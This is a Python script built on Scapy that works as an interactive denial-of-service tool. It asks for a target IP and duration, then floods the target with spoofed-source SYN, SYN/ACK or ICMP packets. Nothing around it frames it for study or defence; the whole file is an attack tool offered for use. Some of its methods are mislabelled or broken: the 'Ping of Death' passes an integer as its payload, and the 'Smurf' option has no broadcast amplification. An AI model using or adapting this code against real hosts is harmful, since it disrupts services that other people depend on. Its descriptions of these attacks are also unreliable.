from scapy.all import *  # Import all functions from Scapy
import random  # For generating random values
import time  # For managing attack durations

# Function to generate a random IP address
def generate_ip():
    # Generate 4 random numbers to create an IP address
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

# Main function to execute the DDoS attack
def execute_ddos(victim_ip, method, attack_duration):
    # Target port for the attack
    port_target = 12345
    # Calculate when the attack should end
    expiration = time.time() + attack_duration

    # If method is SYN Flood
    if method == "syn_flood":
        # While the attack is ongoing
        while time.time() < expiration:
            # Generate random source IP and source port
            src_ip = generate_ip()
            src_port = random.randint(1024, 65535)
            # Create and send a TCP SYN packet
            packet = IP(src=src_ip, dst=victim_ip) / TCP(sport=src_port, dport=port_target, flags="S")
            send(packet, verbose=0)

    # If method is Ping of Death (PoD)
    elif method == "pod":
        while time.time() < expiration:
            # Generate random source IP
            src_ip = generate_ip()
            # Create and send an ICMP packet with a large payload
            packet = IP(src=src_ip, dst=victim_ip) / ICMP() / Raw(load=6000)
            send(packet, verbose=0)

    # If method is SYN/ACK Flood
    elif method == "syn_ack":
        while time.time() < expiration:
            # Generate random source IP and source port
            src_ip = generate_ip()
            src_port = random.randint(1024, 65535)
            # Create and send a TCP SYN/ACK packet
            packet = IP(src=src_ip, dst=victim_ip) / TCP(sport=src_port, dport=port_target, flags="SA")
            send(packet, verbose=0)

    # If method is Smurf Attack
    elif method == "smurf":
        while time.time() < expiration:
            # Generate random source IP
            src_ip = generate_ip()
            # Create and send an ICMP packet
            packet = IP(src=src_ip, dst=victim_ip) / ICMP()
            send(packet, verbose=0)

# Main code, runs when the script is executed
if __name__ == "__main__":
    # Ask for the target IP
    victim_ip = input("Enter the target IP address: ")

    # Ask the user for the type of attack
    print("Choose the type of attack:")
    print("1 - SYN Flood")
    print("2 - Ping of Death (PoD)")
    print("3 - SYN/ACK Flood")
    print("4 - Smurf Attack")
    method_choice = input("Enter the number corresponding to the type of attack: ")

    # Associate the choice with an attack type
    if method_choice == "1":
        method = "syn_flood"
    elif method_choice == "2":
        method = "pod"
    elif method_choice == "3":
        method = "syn_ack"
    elif method_choice == "4":
        method = "smurf"
    else:
        print("Invalid choice.")
        exit()

    # Ask for the duration of the attack in seconds
    attack_duration = int(input("Enter the attack duration in seconds: "))

    # Launch the attack
    execute_ddos(victim_ip, method, attack_duration)
